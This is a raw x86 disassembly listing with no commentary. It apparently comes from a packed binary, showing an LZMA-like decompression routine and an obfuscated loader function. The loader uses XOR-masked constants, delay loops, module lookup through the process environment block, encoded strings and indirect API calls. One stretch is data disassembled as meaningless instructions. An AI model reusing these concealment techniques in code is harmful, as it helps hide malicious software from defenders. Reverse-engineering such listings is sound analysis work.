  4253f6:	and    ecx,0x1
  4253f9:	cmp    esi,ecx
  4253fb:	mov    esi,0x100
  425400:	jne    0x425410
  425402:	cmp    eax,esi
  425404:	jb     0x4253dd
  425406:	jmp    0x42541c
  425408:	mov    ebp,DWORD PTR [ebp-0x34]
  42540b:	call   0x4256a1
  425410:	inc    eax
  425411:	inc    esi
  425412:	sub    eax,0x1
  425415:	sub    esi,0x1
  425418:	cmp    eax,esi
  42541a:	jb     0x425408
  42541c:	pop    edx
  42541d:	inc    edx
  42541e:	cmp    edx,0x5
  425421:	dec    edx
  425422:	mov    ecx,edx
  425424:	jb     0x425435
  425426:	inc    edx
  425427:	cmp    edx,0xb
  42542a:	dec    edx
  42542b:	mov    cl,0x4
  42542d:	dec    cl
  42542f:	jb     0x425435
  425431:	mov    cl,0x7
  425433:	dec    cl
  425435:	sub    edx,ecx
  425437:	push   edx
  425438:	jmp    0x425489
  42543a:	mov    al,0xc1
  42543c:	dec    al
  42543e:	call   0x425692
  425443:	jne    0x425459
  425445:	pop    eax
  425446:	pop    edi
  425447:	pop    edx
  425448:	pop    ecx
  425449:	pop    edx
  42544a:	pop    ecx
  42544b:	push   DWORD PTR [esp]
  42544e:	push   ecx
  42544f:	push   edx
  425450:	mov    edx,0x664
  425455:	mov    cl,0x0
  425457:	jmp    0x4254cc
  425459:	mov    al,0xcd
  42545b:	dec    al
  42545d:	call   0x425692
  425462:	jne    0x425492
  425464:	mov    al,0xf1
  425466:	dec    al
  425468:	call   0x425682
  42546d:	jne    0x4254c2
  42546f:	pop    eax
  425470:	cmp    al,0x7
  425472:	mov    al,0x9
  425474:	jb     0x425478
  425476:	mov    al,0xb
  425478:	push   eax
  425479:	mov    esi,DWORD PTR [ebp-0x4]
  42547c:	sub    esi,DWORD PTR [ebp-0x24]
  42547f:	cmp    esi,DWORD PTR [ebp+0x24]
  425482:	jb     0x425659
  425488:	lods   al,BYTE PTR ds:[esi]
  425489:	mov    edi,DWORD PTR [ebp-0x4]
  42548c:	stos   BYTE PTR es:[edi],al
  42548d:	jmp    0x425620
  425492:	mov    al,0xd8
  425494:	call   0x425692
  425499:	mov    esi,DWORD PTR [ebp-0x28]
  42549c:	je     0x4254b9
  42549e:	mov    al,0xe4
  4254a0:	call   0x425692
  4254a5:	mov    esi,DWORD PTR [ebp-0x2c]
  4254a8:	je     0x4254b3
  4254aa:	mov    esi,DWORD PTR [ebp-0x30]
  4254ad:	mov    ecx,DWORD PTR [ebp-0x2c]
  4254b0:	mov    DWORD PTR [ebp-0x30],ecx
  4254b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4254b6:	mov    DWORD PTR [ebp-0x2c],ecx
  4254b9:	mov    ecx,DWORD PTR [ebp-0x24]
  4254bc:	mov    DWORD PTR [ebp-0x28],ecx
  4254bf:	mov    DWORD PTR [ebp-0x24],esi
  4254c2:	pop    eax
  4254c3:	pop    edi
  4254c4:	pop    ecx
  4254c5:	mov    edx,0xa68
  4254ca:	mov    cl,0x8
  4254cc:	add    edx,edi
  4254ce:	push   edx
  4254cf:	push   edi
  4254d0:	cmp    al,0x7
  4254d2:	mov    al,cl
  4254d4:	jb     0x4254d8
  4254d6:	add    al,0x3
  4254d8:	push   eax
  4254d9:	mov    ebp,DWORD PTR [ebp-0x34]
  4254dc:	call   0x42569f
  4254e1:	jne    0x4254f7
  4254e3:	mov    eax,DWORD PTR [ebp-0x18]
  4254e6:	mov    edi,DWORD PTR [ebp-0x34]
  4254e9:	shl    eax,0x3
  4254ec:	sub    ecx,ecx
  4254ee:	push   0x8
  4254f0:	pop    esi
  4254f1:	lea    edi,[edi+eax*2+0x4]
  4254f5:	jmp    0x42552c
  4254f7:	mov    ebp,DWORD PTR [ebp-0x34]
  4254fa:	add    ebp,0x2
  4254fd:	call   0x42569f
  425502:	jne    0x42551c
  425504:	mov    eax,DWORD PTR [ebp-0x18]
  425507:	mov    edi,DWORD PTR [ebp-0x34]
  42550a:	shl    eax,0x3
  42550d:	push   0x8
  42550f:	pop    ecx
  425510:	push   0x8
  425512:	pop    esi
  425513:	lea    edi,[edi+eax*2+0x104]
  42551a:	jmp    0x42552c
  42551c:	mov    edi,0x204
  425521:	add    edi,DWORD PTR [ebp-0x34]
  425524:	push   0x10
  425526:	pop    ecx
  425527:	mov    esi,0x100
  42552c:	mov    DWORD PTR [ebp-0x1c],ecx
  42552f:	sub    eax,eax
  425531:	inc    eax
  425532:	mov    ebp,edi
  425534:	call   0x4256a1
  425539:	mov    ecx,eax
  42553b:	sub    ecx,esi
  42553d:	jb     0x425532
  42553f:	add    DWORD PTR [ebp-0x1c],ecx
  425542:	cmp    DWORD PTR [ebp-0x3c],0x4
  425546:	jae    0x4255fc
  42554c:	add    DWORD PTR [ebp-0x3c],0x7
  425550:	mov    ecx,DWORD PTR [ebp-0x1c]
  425553:	cmp    ecx,0x4
  425556:	jb     0x42555b
  425558:	push   0x3
  42555a:	pop    ecx
  42555b:	mov    edi,DWORD PTR [ebp-0x38]
  42555e:	shl    ecx,0x6
  425561:	sub    eax,eax
  425563:	inc    eax
  425564:	push   0x40
  425566:	pop    esi
  425567:	lea    edi,[edi+ecx*2+0x360]
  42556e:	mov    ebp,edi
  425570:	call   0x4256a1
  425575:	mov    ecx,eax
  425577:	sub    ecx,esi
  425579:	jb     0x42556e
  42557b:	mov    DWORD PTR [ebp-0x18],ecx
  42557e:	mov    DWORD PTR [ebp-0x24],ecx
  425581:	cmp    ecx,0x4
  425584:	jb     0x4255f9
  425586:	mov    esi,ecx
  425588:	and    DWORD PTR [ebp-0x24],0x1
  42558c:	shr    esi,1
  42558e:	or     DWORD PTR [ebp-0x24],0x2
  425592:	dec    esi
  425593:	cmp    ecx,0xe
  425596:	jae    0x4255b1
  425598:	mov    eax,0x2af
  42559d:	sub    eax,ecx
  42559f:	mov    ecx,esi
  4255a1:	shl    BYTE PTR [ebp-0x24],cl
  4255a4:	add    eax,DWORD PTR [ebp-0x24]
  4255a7:	shl    eax,1
  4255a9:	add    eax,DWORD PTR [ebp-0x38]
  4255ac:	mov    DWORD PTR [ebp-0x34],eax
  4255af:	jmp    0x4255de
  4255b1:	sub    esi,0x4
  4255b4:	call   0x42565e
  4255b9:	shr    ebx,1
  4255bb:	shl    DWORD PTR [ebp-0x24],1
  4255be:	cmp    DWORD PTR [ebp-0x20],ebx
  4255c1:	jb     0x4255c9
  4255c3:	inc    DWORD PTR [ebp-0x24]
  4255c6:	sub    DWORD PTR [ebp-0x20],ebx
  4255c9:	dec    esi
  4255ca:	jne    0x4255b4
  4255cc:	mov    eax,0x644
  4255d1:	add    eax,DWORD PTR [ebp-0x38]
  4255d4:	mov    DWORD PTR [ebp-0x34],eax
  4255d7:	shl    DWORD PTR [ebp-0x24],0x4
  4255db:	push   0x4
  4255dd:	pop    esi
  4255de:	sub    edi,edi
  4255e0:	inc    edi
  4255e1:	mov    eax,edi
  4255e3:	mov    ebp,DWORD PTR [ebp-0x34]
  4255e6:	call   0x4256a1
  4255eb:	test   al,0x1
  4255ed:	je     0x4255f2
  4255ef:	or     DWORD PTR [ebp-0x24],edi
  4255f2:	shl    edi,1
  4255f4:	dec    esi
  4255f5:	jne    0x4255e3
  4255f7:	jmp    0x4255f9
  4255f9:	inc    DWORD PTR [ebp-0x24]
  4255fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255ff:	add    ecx,0x2
  425602:	mov    edi,DWORD PTR [ebp-0x4]
  425605:	mov    eax,edi
  425607:	sub    eax,DWORD PTR [ebp+0x24]
  42560a:	cmp    DWORD PTR [ebp-0x24],eax
  42560d:	ja     0x425659
  42560f:	mov    esi,edi
  425611:	sub    esi,DWORD PTR [ebp-0x24]
  425614:	mov    edx,DWORD PTR [ebp+0x28]
  425617:	lods   al,BYTE PTR ds:[esi]
  425618:	stos   BYTE PTR es:[edi],al
  425619:	cmp    edi,edx
  42561b:	jae    0x425620
  42561d:	dec    ecx
  42561e:	jne    0x425617
  425620:	mov    DWORD PTR [ebp-0x4],edi
  425623:	movzx  esi,al
  425626:	cmp    edi,DWORD PTR [ebp+0x28]
  425629:	jb     0x42538a
  42562f:	call   0x42565e
  425634:	sub    eax,eax
  425636:	lea    ebp,[esp+0x3c]
  42563a:	mov    edx,DWORD PTR [ebp+0x20]
  42563d:	mov    esi,DWORD PTR [ebp-0x8]
  425640:	sub    esi,DWORD PTR [ebp+0x18]
  425643:	mov    DWORD PTR [ebp-0x4d],ecx
  425646:	fidiv  DWORD PTR ds:0x31787ab3
  42564c:	jp     0x425663
  42564e:	stos   DWORD PTR es:[edi],eax
  42564f:	ins    DWORD PTR es:[edi],dx
  425650:	lods   al,BYTE PTR ds:[esi]
  425651:	repnz inc BYTE PTR [edx]
  425654:	nop
  425655:	cmc    
  425656:	test   esi,edi
  425658:	out    0x31,al
  42565a:	mov    BYTE PTR [esi+0x748be834],al
  425660:	test   DWORD PTR [ebp-0x76b1767b],eax
  425666:	xchg   esp,eax
  425667:	mov    WORD PTR [eiz*4+0x685ab3de],ss
  42566e:	jno    0x4256ca
  425670:	cmc    
  425671:	push   edx
  425672:	sbb    BYTE PTR [ebx+0x88c089a],dh
  425678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425679:	aaa    
  42567a:	stos   DWORD PTR es:[edi],eax
  42567b:	call   0x94fe:0x685aab08
  425682:	mov    bl,0xba
  425684:	cwde   
  425685:	rcr    DWORD PTR [edi-0x78],0x8c
  425689:	or     al,0x95
  42568b:	xchg   ecx,eax
  42568c:	call   0xc19d:0x348c9128
  425693:	pop    edi
  425694:	mov    BYTE PTR [ecx+0x3ab3989a],dl
  42569a:	test   al,0xbb
  42569c:	ss call 0x9a36:0xbb883185
  4256a4:	test   DWORD PTR [ebx-0x7a7a7a8c],ecx
  4256aa:	mov    DWORD PTR [edx-0xb],edx
  4256ad:	mov    bl,0xb6
  4256af:	adc    eax,0x15168c65
  4256b4:	add    eax,0x15b671a5
  4256b9:	not    BYTE PTR [edx-0x9]
  4256bc:	scas   eax,DWORD PTR es:[edi]
  4256bd:	leave  
  4256be:	test   BYTE PTR [esi+0x148c6515],dl
  4256c4:	or     BYTE PTR [eax-0x74dfdbac],cl
  4256ca:	retf   
  4256cb:	movzx  edx,WORD PTR [ebp+0x0]
  4256cf:	shr    ecx,0xb
  4256d2:	imul   ecx,edx
  4256d5:	cmp    DWORD PTR [esp+0x20],ecx
  4256d9:	jae    0x4256f2
  4256db:	mov    ebx,ecx
  4256dd:	mov    ecx,0x800
  4256e2:	sub    ecx,edx
  4256e4:	shr    ecx,0x5
  4256e7:	add    WORD PTR [ebp+0x0],cx
  4256eb:	add    eax,eax
  4256ed:	lea    ebp,[esp+0x40]
  4256f1:	ret    
  4256f2:	shr    edx,0x5
  4256f5:	sub    DWORD PTR [esp+0x20],ecx
  4256f9:	sub    ebx,ecx
  4256fb:	sub    WORD PTR [ebp+0x0],dx
  4256ff:	add    eax,eax
  425701:	add    eax,0x1
  425704:	lea    ebp,[esp+0x40]
  425708:	ret    
  425709:	push   ebp
  42570a:	mov    ebp,esp
  42570c:	sub    esp,0x12c
  425712:	push   ebx
  425713:	push   esi
  425714:	push   edi
  425715:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  42571c:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425723:	mov    eax,DWORD PTR [ebp+0x8]
  425726:	mov    DWORD PTR [ebp+0x8],eax
  425729:	mov    ecx,DWORD PTR [ebp-0x10]
  42572c:	mov    ebx,0x75108a8
  425731:	xor    ecx,ebx
  425733:	mov    eax,0x3272ef
  425738:	add    ecx,eax
  42573a:	mov    DWORD PTR [ebp-0x24],ecx
  42573d:	mov    ecx,DWORD PTR [ebp-0x10]
  425740:	xor    ecx,ebx
  425742:	add    ecx,eax
  425744:	mov    DWORD PTR [ebp-0x40],ecx
  425747:	mov    ecx,DWORD PTR [ebp-0x10]
  42574a:	xor    ecx,ebx
  42574c:	add    ecx,eax
  42574e:	mov    DWORD PTR [ebp-0x3c],ecx
  425751:	mov    ecx,DWORD PTR [ebp-0x10]
  425754:	xor    ecx,ebx
  425756:	add    ecx,eax
  425758:	mov    DWORD PTR [ebp-0xd8],ecx
  42575e:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  425765:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  42576c:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  425773:	push   0x25
  425775:	pop    ecx
  425776:	mov    DWORD PTR [ebp-0x30],ecx
  425779:	mov    DWORD PTR [ebp-0x30],ecx
  42577c:	push   0x65
  42577e:	pop    ecx
  42577f:	mov    DWORD PTR [ebp-0x30],ecx
  425782:	mov    DWORD PTR [ebp-0x30],ecx
  425785:	mov    DWORD PTR [ebp-0x30],0x4d
  42578c:	mov    DWORD PTR [ebp-0x30],0x43
  425793:	mov    ecx,DWORD PTR [ebp-0x10]
  425796:	xor    ecx,ebx
  425798:	add    ecx,eax
  42579a:	mov    DWORD PTR [ebp-0x30],ecx
  42579d:	mov    ecx,DWORD PTR [ebp-0x10]
  4257a0:	xor    ecx,ebx
  4257a2:	add    ecx,eax
  4257a4:	mov    DWORD PTR [ebp-0x30],ecx
  4257a7:	mov    DWORD PTR [ebp-0x28],0x258
  4257ae:	mov    DWORD PTR [ebp-0x34],0x36
  4257b5:	mov    DWORD PTR [ebp-0x14],0x7a
  4257bc:	lea    edi,[ebp-0x10c]
  4257c2:	lea    esi,[ebp-0x12c]
  4257c8:	call   0x426487
  4257cd:	dec    DWORD PTR [ebp-0x14]
  4257d0:	jne    0x4257bc
  4257d2:	dec    DWORD PTR [ebp-0x34]
  4257d5:	jne    0x4257b5
  4257d7:	dec    DWORD PTR [ebp-0x28]
  4257da:	jne    0x4257ae
  4257dc:	mov    DWORD PTR [ebp-0x28],0x400e
  4257e3:	mov    eax,DWORD PTR [ebp-0x10]
  4257e6:	xor    eax,ebx
  4257e8:	mov    esi,0x3272ef
  4257ed:	add    eax,esi
  4257ef:	mov    DWORD PTR [ebp-0x1c],eax
  4257f2:	mov    eax,DWORD PTR [ebp-0x10]
  4257f5:	and    DWORD PTR [ebp-0x94],0x0
  4257fc:	xor    eax,ebx
  4257fe:	add    eax,esi
  425800:	mov    DWORD PTR [ebp-0x38],eax
  425803:	mov    eax,fs:0x18
  425809:	mov    DWORD PTR [ebp-0x94],eax
  42580f:	mov    eax,DWORD PTR [eax+0x30]
  425812:	mov    DWORD PTR [ebp-0xcc],eax
  425818:	mov    eax,DWORD PTR [eax+0xc]
  42581b:	mov    DWORD PTR [ebp-0xc0],eax
  425821:	mov    eax,DWORD PTR [ebp+0x8]
  425824:	lea    ecx,[ebp-0x94]
  42582a:	mov    DWORD PTR [eax+0x1a0],ecx
  425830:	mov    eax,DWORD PTR [ebp+0x8]
  425833:	lea    ecx,[ebp-0xcc]
  425839:	mov    DWORD PTR [eax+0x1a4],ecx
  42583f:	mov    eax,DWORD PTR [ebp+0x8]
  425842:	push   DWORD PTR [ebp+0x8]
  425845:	lea    ecx,[ebp-0xc0]
  42584b:	mov    DWORD PTR [eax+0x1a8],ecx
  425851:	call   0x427c48
  425856:	mov    ecx,DWORD PTR [ebp-0x10]
  425859:	xor    ecx,ebx
  42585b:	add    ecx,esi
  42585d:	cmp    ecx,eax
  42585f:	je     0x425be2
  425865:	mov    eax,DWORD PTR [ebp+0x8]
  425868:	mov    eax,DWORD PTR [eax+0x194]
  42586e:	mov    ecx,DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x8]
  425873:	mov    eax,DWORD PTR [eax+0x194]
  425879:	mov    eax,DWORD PTR [eax]
  42587b:	add    eax,DWORD PTR [ecx+0x3c]
  42587e:	mov    ecx,DWORD PTR [ebp+0x8]
  425881:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425887:	lea    edx,[ebp-0xec]
  42588d:	push   edx
  42588e:	mov    edx,DWORD PTR [ebp+0x8]
  425891:	mov    edx,DWORD PTR [edx+0x18c]
  425897:	mov    edx,DWORD PTR [edx]
  425899:	add    edx,DWORD PTR [eax+0x88]
  42589f:	push   0x4
  4258a1:	push   DWORD PTR [eax+0x8c]
  4258a7:	push   edx
  4258a8:	call   DWORD PTR [ecx+0x1c]
  4258ab:	push   DWORD PTR [ebp+0x8]
  4258ae:	xor    eax,eax
  4258b0:	mov    DWORD PTR [ebp-0xa8],0x123f0f31
  4258ba:	mov    DWORD PTR [ebp-0xa4],0xb360819
  4258c4:	mov    DWORD PTR [ebp-0xa0],0x39081d03
  4258ce:	mov    BYTE PTR [ebp-0x9c],0x7a
  4258d5:	lea    edi,[ebp-0x9b]
  4258db:	stos   DWORD PTR es:[edi],eax
  4258dc:	stos   WORD PTR es:[edi],ax
  4258de:	stos   BYTE PTR es:[edi],al
  4258df:	xor    eax,eax
  4258e1:	mov    DWORD PTR [ebp-0xbc],0x123f0f31
  4258eb:	mov    DWORD PTR [ebp-0xb8],0xb360819
  4258f5:	mov    DWORD PTR [ebp-0xb4],0x23081d03
  4258ff:	mov    BYTE PTR [ebp-0xb0],0x7a
  425906:	lea    edi,[ebp-0xaf]
  42590c:	stos   DWORD PTR es:[edi],eax
  42590d:	stos   WORD PTR es:[edi],ax
  42590f:	stos   BYTE PTR es:[edi],al
  425910:	mov    edi,DWORD PTR [ebp+0x8]
  425913:	mov    eax,DWORD PTR [ebp+0x8]
  425916:	mov    edx,DWORD PTR [eax+0x1b8]
  42591c:	mov    DWORD PTR [ebp-0x68],0x80e0f16
  425923:	mov    DWORD PTR [ebp-0x64],0x110a151f
  42592a:	mov    WORD PTR [ebp-0x60],0x7a39
  425930:	mov    DWORD PTR [ebp-0x90],0x123f0f31
  42593a:	mov    DWORD PTR [ebp-0x8c],0x16390819
  425944:	mov    DWORD PTR [ebp-0x88],0x3419120a
  42594e:	mov    DWORD PTR [ebp-0x84],0x81d150d
  425958:	mov    DWORD PTR [ebp-0x80],0x7a391f11
  42595f:	mov    DWORD PTR [ebp-0x7c],0x123f0f31
  425966:	mov    DWORD PTR [ebp-0x78],0x16390819
  42596d:	mov    DWORD PTR [ebp-0x74],0x3419120a
  425974:	mov    DWORD PTR [ebp-0x70],0x81d150d
  42597b:	mov    DWORD PTR [ebp-0x6c],0x7a231f11
  425982:	call   0x427c77
  425987:	push   eax
  425988:	mov    eax,DWORD PTR [ebp+0x8]
  42598b:	mov    eax,DWORD PTR [eax+0x1a8]
  425991:	push   DWORD PTR [eax]
  425993:	call   0x427918
  425998:	test   eax,eax
  42599a:	jne    0x4259ec
  42599c:	mov    eax,DWORD PTR [ebp+0x8]
  42599f:	mov    eax,DWORD PTR [eax+0x1e0]
  4259a5:	mov    edi,DWORD PTR [ebp+0x8]
  4259a8:	add    eax,0x4
  4259ab:	mov    DWORD PTR [ebp-0x20],eax
  4259ae:	mov    eax,DWORD PTR [ebp+0x8]
  4259b1:	mov    edx,DWORD PTR [eax+0x1b8]
  4259b7:	call   0x427c77
  4259bc:	push   eax
  4259bd:	mov    eax,DWORD PTR [ebp-0x20]
  4259c0:	call   DWORD PTR [eax]
  4259c2:	test   eax,eax
  4259c4:	jne    0x4259ec
  4259c6:	mov    eax,DWORD PTR [ebp+0x8]
  4259c9:	mov    eax,DWORD PTR [eax+0x1e0]
  4259cf:	mov    edi,DWORD PTR [ebp+0x8]
  4259d2:	add    eax,0x10
  4259d5:	mov    DWORD PTR [ebp-0x20],eax
  4259d8:	mov    eax,DWORD PTR [ebp+0x8]
  4259db:	mov    edx,DWORD PTR [eax+0x1b8]
  4259e1:	call   0x427c77
  4259e6:	push   eax
  4259e7:	mov    eax,DWORD PTR [ebp-0x20]
  4259ea:	call   DWORD PTR [eax]
  4259ec:	mov    eax,DWORD PTR [ebp-0x10]
  4259ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4259f2:	xor    eax,ebx
  4259f4:	add    eax,esi
  4259f6:	cmp    eax,ecx
  4259f8:	je     0x425bbb
  4259fe:	mov    eax,DWORD PTR [ebp-0x18]
  425a01:	xor    eax,ebx
  425a03:	mov    ecx,0xffcd8d11
  425a08:	sub    ecx,eax
  425a0a:	add    ecx,DWORD PTR [ebp-0x28]
  425a0d:	mov    eax,DWORD PTR [ebp-0x1c]
  425a10:	cmp    eax,ecx
  425a12:	ja     0x425bbb
  425a18:	mov    DWORD PTR [ebp-0x34],0x0
  425a1f:	push   DWORD PTR [ebp+0x8]
  425a22:	mov    edi,DWORD PTR [ebp+0x8]
  425a25:	mov    eax,DWORD PTR [ebp+0x8]
  425a28:	mov    edx,DWORD PTR [eax+0x1b4]
  425a2e:	call   0x427c77
  425a33:	push   eax
  425a34:	mov    eax,DWORD PTR [ebp+0x8]
  425a37:	mov    eax,DWORD PTR [eax+0x1a8]
  425a3d:	push   DWORD PTR [eax]
  425a3f:	call   0x427918
  425a44:	mov    ecx,DWORD PTR [ebp+0x8]
  425a47:	mov    ecx,DWORD PTR [ecx+0x19c]
  425a4d:	mov    DWORD PTR [ecx],eax
  425a4f:	mov    eax,DWORD PTR [ebp+0x8]
  425a52:	mov    edi,DWORD PTR [eax+0x1e0]
  425a58:	mov    esi,DWORD PTR [ebp+0x8]
  425a5b:	xor    eax,eax
  425a5d:	lea    edx,[ebp-0x7c]
  425a60:	call   0x427cad
  425a65:	push   eax
  425a66:	mov    eax,DWORD PTR [ebp+0x8]
  425a69:	mov    eax,DWORD PTR [eax+0x19c]
  425a6f:	push   DWORD PTR [eax]
  425a71:	call   DWORD PTR [edi+0x8]
  425a74:	mov    DWORD PTR [ebp-0x20],eax
  425a77:	mov    eax,DWORD PTR [ebp+0x8]
  425a7a:	mov    edi,DWORD PTR [eax+0x1e0]
  425a80:	mov    esi,DWORD PTR [ebp+0x8]
  425a83:	xor    eax,eax
  425a85:	lea    edx,[ebp-0x90]
  425a8b:	call   0x427cad
  425a90:	push   eax
  425a91:	mov    eax,DWORD PTR [ebp+0x8]
  425a94:	mov    eax,DWORD PTR [eax+0x19c]
  425a9a:	push   DWORD PTR [eax]
  425a9c:	call   DWORD PTR [edi+0x8]
  425a9f:	mov    eax,DWORD PTR [ebp+0x8]
  425aa2:	mov    edi,DWORD PTR [eax+0x1e0]
  425aa8:	mov    esi,DWORD PTR [ebp+0x8]
  425aab:	xor    eax,eax
  425aad:	lea    edx,[ebp-0xa8]
  425ab3:	call   0x427cad
  425ab8:	push   eax
  425ab9:	mov    eax,DWORD PTR [ebp+0x8]
  425abc:	mov    eax,DWORD PTR [eax+0x19c]
  425ac2:	push   DWORD PTR [eax]
  425ac4:	call   DWORD PTR [edi+0x8]
  425ac7:	and    DWORD PTR [ebp-0x8],0x0
  425acb:	mov    DWORD PTR [ebp-0x48],eax
  425ace:	mov    eax,DWORD PTR [ebp-0x8]
  425ad1:	and    eax,0x7
  425ad4:	add    eax,0x31
  425ad7:	push   eax
  425ad8:	call   DWORD PTR [ebp-0x20]
  425adb:	test   eax,eax
  425add:	je     0x425b21
  425adf:	mov    eax,DWORD PTR [ebp-0x8]
  425ae2:	push   0x19
  425ae4:	xor    edx,edx
  425ae6:	pop    ecx
  425ae7:	div    ecx
  425ae9:	add    dl,0x41
  425aec:	movzx  eax,dl
  425aef:	push   eax
  425af0:	call   DWORD PTR [ebp-0x48]
  425af3:	test   eax,eax
  425af5:	jne    0x425b21
  425af7:	mov    eax,DWORD PTR [ebp+0x8]
  425afa:	mov    edi,DWORD PTR [eax+0x1e0]
  425b00:	mov    esi,DWORD PTR [ebp+0x8]
  425b03:	xor    eax,eax
  425b05:	lea    edx,[ebp-0x68]
  425b08:	call   0x427cad
  425b0d:	push   eax
  425b0e:	mov    eax,DWORD PTR [ebp+0x8]
  425b11:	mov    eax,DWORD PTR [eax+0x198]
  425b17:	push   DWORD PTR [eax]
  425b19:	call   DWORD PTR [edi+0x8]
  425b1c:	mov    DWORD PTR [ebp-0x14],eax
  425b1f:	jmp    0x425b25
  425b21:	and    DWORD PTR [ebp-0x14],0x0
  425b25:	inc    DWORD PTR [ebp-0x8]
  425b28:	cmp    DWORD PTR [ebp-0x8],0x10
  425b2c:	jb     0x425ace
  425b2e:	mov    eax,DWORD PTR [ebp-0x18]
  425b31:	mov    esi,DWORD PTR [ebp+0x8]
  425b34:	xor    eax,ebx
  425b36:	mov    edi,0x3272ef
  425b3b:	add    eax,edi
  425b3d:	lea    edx,[ebp-0x10c]
  425b43:	call   0x427cad
  425b48:	push   eax
  425b49:	mov    eax,DWORD PTR [ebp-0x10]
  425b4c:	mov    esi,DWORD PTR [ebp+0x8]
  425b4f:	xor    eax,ebx
  425b51:	add    eax,edi
  425b53:	lea    edx,[ebp-0x12c]
  425b59:	call   0x427cad
  425b5e:	push   eax
  425b5f:	call   DWORD PTR [ebp-0x14]
  425b62:	mov    ecx,DWORD PTR [ebp-0x10]
  425b65:	xor    ecx,ebx
  425b67:	add    ecx,edi
  425b69:	cmp    ecx,eax
  425b6b:	jne    0x425b74
  425b6d:	mov    DWORD PTR [ebp-0x34],0x1
  425b74:	mov    eax,DWORD PTR [ebp-0x18]
  425b77:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b7a:	xor    eax,ebx
  425b7c:	lea    eax,[eax+ecx*1+0x3272ef]
  425b83:	mov    DWORD PTR [ebp-0x1c],eax
  425b86:	mov    eax,DWORD PTR [ebp-0x34]
  425b89:	test   eax,eax
  425b8b:	je     0x425b9f
  425b8d:	mov    eax,DWORD PTR [ebp-0x18]
  425b90:	mov    ecx,DWORD PTR [ebp-0x38]
  425b93:	xor    eax,ebx
  425b95:	lea    eax,[eax+ecx*1+0x3272ef]
  425b9c:	mov    DWORD PTR [ebp-0x38],eax
  425b9f:	mov    eax,DWORD PTR [ebp-0x18]
  425ba2:	xor    eax,ebx
  425ba4:	mov    ecx,0xffcd8d11
  425ba9:	sub    ecx,eax
  425bab:	add    ecx,DWORD PTR [ebp-0x28]
  425bae:	mov    eax,DWORD PTR [ebp-0x1c]
  425bb1:	cmp    eax,ecx
  425bb3:	jbe    0x425a18
  425bb9:	mov    esi,edi
  425bbb:	mov    eax,DWORD PTR [ebp-0x38]
  425bbe:	mov    ecx,DWORD PTR [ebp-0x1c]
  425bc1:	cmp    ecx,eax
  425bc3:	jne    0x425bd6
  425bc5:	push   DWORD PTR [ebp+0x8]
  425bc8:	lea    eax,[ebp-0x40]
  425bcb:	push   eax
  425bcc:	call   0x42871a
  425bd1:	mov    DWORD PTR [ebp-0x24],eax
  425bd4:	jmp    0x425be2
  425bd6:	mov    eax,DWORD PTR [ebp-0x24]
  425bd9:	mov    ecx,DWORD PTR [ebp-0x18]
  425bdc:	xor    ecx,ebx
  425bde:	add    ecx,esi
  425be0:	xor    DWORD PTR [eax],ecx
  425be2:	mov    eax,DWORD PTR [ebp-0x10]
  425be5:	mov    ecx,DWORD PTR [ebp-0x24]
  425be8:	xor    eax,ebx
  425bea:	add    eax,esi
  425bec:	cmp    eax,ecx
  425bee:	je     0x426365
  425bf4:	mov    eax,DWORD PTR [ebp-0x10]
  425bf7:	mov    ecx,DWORD PTR [ebp-0x40]
  425bfa:	xor    eax,ebx
  425bfc:	add    eax,esi
  425bfe:	cmp    eax,ecx
  425c00:	je     0x426365
  425c06:	mov    eax,DWORD PTR [ebp-0x10]
  425c09:	xor    eax,ebx
  425c0b:	add    eax,esi
  425c0d:	jmp    0x425c2b
  425c0f:	mov    edi,DWORD PTR [ebp-0x24]
  425c12:	mov    cl,al
  425c14:	and    cl,0x1f
  425c17:	or     dl,0xff
  425c1a:	sub    dl,cl
  425c1c:	add    BYTE PTR [edi+eax*1],dl
  425c1f:	mov    ecx,DWORD PTR [ebp-0x18]
  425c22:	xor    ecx,ebx
  425c24:	lea    eax,[eax+ecx*1+0x3272ef]
  425c2b:	mov    ecx,DWORD PTR [ebp-0x40]
  425c2e:	cmp    eax,ecx
  425c30:	jb     0x425c0f
  425c32:	mov    eax,DWORD PTR [ebp-0x40]
  425c35:	mov    DWORD PTR [ebp-0x28],eax
  425c38:	mov    eax,DWORD PTR [ebp-0x24]
  425c3b:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  425c42:	mov    DWORD PTR [ebp-0xd4],eax
  425c48:	mov    edi,0xf89c85ba
  425c4d:	mov    DWORD PTR [ebp-0x2c],edi
  425c50:	mov    eax,DWORD PTR [ebp-0x38]
  425c53:	xor    eax,ebx
  425c55:	add    eax,esi
  425c57:	mov    DWORD PTR [ebp-0xc],eax
  425c5a:	mov    eax,DWORD PTR [ebp-0x38]
  425c5d:	xor    eax,ebx
  425c5f:	add    eax,esi
  425c61:	mov    DWORD PTR [ebp-0x8],eax
  425c64:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  425c6b:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  425c72:	mov    eax,DWORD PTR [ebp-0x38]
  425c75:	mov    ecx,DWORD PTR [ebp-0x28]
  425c78:	xor    eax,ebx
  425c7a:	add    eax,esi
  425c7c:	cmp    ecx,eax
  425c7e:	je     0x425e7d
  425c84:	jmp    0x425e59
  425c89:	mov    ecx,DWORD PTR [ebp-0xc]
  425c8c:	mov    eax,DWORD PTR [ebp-0x28]
  425c8f:	sub    eax,ecx
  425c91:	mov    ecx,DWORD PTR [ebp-0x48]
  425c94:	xor    ecx,ebx
  425c96:	add    ecx,esi
  425c98:	xor    edx,edx
  425c9a:	div    ecx
  425c9c:	mov    DWORD PTR [ebp-0x8],eax
  425c9f:	mov    eax,DWORD PTR [ebp-0x4c]
  425ca2:	mov    ecx,DWORD PTR [ebp-0x8]
  425ca5:	xor    eax,ebx
  425ca7:	add    eax,esi
  425ca9:	cmp    ecx,eax
  425cab:	jbe    0x425cb7
  425cad:	mov    eax,DWORD PTR [ebp-0x4c]
